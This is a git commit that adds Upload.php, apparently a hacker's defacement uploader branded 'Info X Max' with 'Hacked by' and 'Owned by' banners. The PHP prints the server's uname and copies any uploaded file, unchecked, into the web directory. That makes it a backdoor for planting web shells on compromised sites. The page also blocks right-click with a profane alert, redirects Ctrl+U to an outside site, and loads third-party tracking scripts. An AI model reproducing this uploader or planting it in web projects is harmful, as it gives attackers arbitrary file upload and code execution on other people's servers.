b1caa45a7ab5a2d5b8ea9942d7be49d592118d41
InfoXMax <63856620+InfoXMax@users.noreply.github.com>
2022-11-06 15:52:59 +0100

    create Upload.php

---
+++ Upload.php
@@ -0,0 +1,90 @@
+<html>
+<head>
+	<title>Info X Max Uploader</title>
+<link rel="SHORTCUT ICON" href="http://c.top4top.net/p_559de671.png" type="image/png">
+<body background="https://images4.alphacoders.com/919/thumb-1920-919457.png" oncontextmenu="return false" onmousedown="return false">
+<link href='http://fonts.googleapis.com/css?family=Agency+FB' rel='stylesheet' type='text/css'>
+<style type="text/css">
+@import url(http://fonts.googleapis.com/css?family=Quicksand);
+@import url(http://fonts.googleapis.com/css?family=Josefin Sans);
+@import url(http://fonts.googleapis.com/css?family=Agency FB);
+			body {				
+				background-size: 100%;
+				background-repeat:no-repeat;
+				background-attachment: fixed;
+				background-size: cover;
+				background-position:center;
+				margin: 0px;
+				font-family: Quicksand;
+				font-weight: bold;
+				}
+			img  {
+				opacity:0.800; filter:alpha(opacity=500);
+				}
+				
+				span:{font-family:Agency FB;}
+			font:hover {
+						text-decoration:none;
+						font-family:Agency FB;
+						color:none;
+						}
+input[type=text], input[type=password],input[type=submit] {
+	color: blue;
+	background: transparent;
+-moz-border-radius: 5px;
+-webkit-border-radius:5px;
+border-radius:5px;
+	font-weight: bold;
+	font-size: 10px;
+}
+				
+				<!-- Hacked by Info X Max -->
+	
+		</style>
+		<script src='http://yourjavascript.com/1171704334/efek-salju-faisal.js' type='text/javascript'/>
+</script>
+</head>
+<body>
+<center>
+<div>0wned by:</div>
+<br>
+<img border="0" style="width:400px;" src="http://e.top4top.net/p_317q4d911.png">
+<center>
+<br>
+<?php
+echo php_uname();
+?>
+<br>
+	<br>Upload
+	<?php @$msg = copy($_FILES[hambas][tmp_name],$_FILES[hambas][name]) ? " Oki" : "Soory";echo $_FILES[hambas][name];echo $msg;?> 
+	<form ENCTYPE="multipart/form-data" ACTION="" METHOD="POST">
+		<input NAME="hambas" TYPE="file">
+		<input VALUE="submit" TYPE="submit">
+	</form> 
+<div>Don't Hate the Hacker , Hate the Code.</div>
+<br>
+<!-- début code adresse-ip -->
+<a href="http://www.adresse-ip.net/compteur-simple.php" target="_blank" title="compteur de visites"/></a>
+<script type='text/javascript' src='http://www.adresse-ip.net/java-flash7.php?ident=2011-05-26-13-00-26-540' language="javascript"></script>
+<noscript> 
+	<a href="http://www.adresse-ip.net/compteur-simple.php" target="_blank" title="compteur de visites">compteur de visites</a>
+	 </noscript>
+	 <!-- fin code adresse-ip -->
+
+</center>
+<script>
+var pesen="FUCK YOU !";
+///////////////////////////////////
+function clickIE4(){if (event.button==2){alert(pesen);return false;}}
+function clickNS4(e){if (document.layers||document.getElementById&&!document.all){if (e.which==2||e.which==3){alert(pesen);return false;}}}
+if (document.layers){document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS4;}
+else if (document.all&&!document.getElementById){document.onmousedown=clickIE4;}
+document.oncontextmenu=new Function("alert(pesen);return false")
+</script>
+<script type='text/javascript'>
+//<![CDATA[
+shortcut={all_shortcuts:{},add:function(a,b,c){var d={type:"keydown",propagate:!1,disable_in_input:!1,target:document,keycode:!1};if(c)for(var e in d)"undefined"==typeof c[e]&&(c[e]=d[e]);else c=d;d=c.target,"string"==typeof c.target&&(d=document.getElementById(c.target)),a=a.toLowerCase(),e=function(d){d=d||window.event;if(c.disable_in_input){var e;d.target?e=d.target:d.srcElement&&(e=d.srcElement),3==e.nodeType&&(e=e.parentNode);if("INPUT"==e.tagName||"TEXTAREA"==e.tagName)return}d.keyCode?code=d.keyCode:d.which&&(code=d.which),e=String.fromCharCode(code).toLowerCase(),188==code&&(e=","),190==code&&(e=".");var f=a.split("+"),g=0,h={"`":"~",1:"!",2:"@",3:"#",4:"$",5:"%",6:"^",7:"&",8:"*",9:"(",0:")","-":"_","=":"+",";":":","'":'"',",":"<",".":">","/":"?","\\":"|"},i={esc:27,escape:27,tab:9,space:32,"return":13,enter:13,backspace:8,scrolllock:145,scroll_lock:145,scroll:145,capslock:20,caps_lock:20,caps:20,numlock:144,num_lock:144,num:144,pause:19,"break":19,insert:45,home:36,"delete":46,end:35,pageup:33,page_up:33,pu:33,pagedown:34,page_down:34,pd:34,left:37,up:38,right:39,down:40,f1:112,f2:113,f3:114,f4:115,f5:116,f6:117,f7:118,f8:119,f9:120,f10:121,f11:122,f12:123},j=!1,l=!1,m=!1,n=!1,o=!1,p=!1,q=!1,r=!1;d.ctrlKey&&(n=!0),d.shiftKey&&(l=!0),d.altKey&&(p=!0),d.metaKey&&(r=!0);for(var s=0;k=f[s],s<f.length;s++)"ctrl"==k||"control"==k?(g++,m=!0):"shift"==k?(g++,j=!0):"alt"==k?(g++,o=!0):"meta"==k?(g++,q=!0):1<k.length?i[k]==code&&g++:c.keycode?c.keycode==code&&g++:e==k?g++:h[e]&&d.shiftKey&&(e=h[e],e==k&&g++);if(g==f.length&&n==m&&l==j&&p==o&&r==q&&(b(d),!c.propagate))return d.cancelBubble=!0,d.returnValue=!1,d.stopPropagation&&(d.stopPropagation(),d.preventDefault()),!1},this.all_shortcuts[a]={callback:e,target:d,event:c.type},d.addEventListener?d.addEventListener(c.type,e,!1):d.attachEvent?d.attachEvent("on"+c.type,e):d["on"+c.type]=e},remove:function(a){var a=a.toLowerCase(),b=this.all_shortcuts[a];delete this.all_shortcuts[a];if(b){var a=b.event,c=b.target,b=b.callback;c.detachEvent?c.detachEvent("on"+a,b):c.removeEventListener?c.removeEventListener(a,b,!1):c["on"+a]=!1}}},shortcut.add("Ctrl+U",function(){top.location.href="http://www.informatiquemax.net/"});
+//]]>
+</script>
+</body>
+</html>
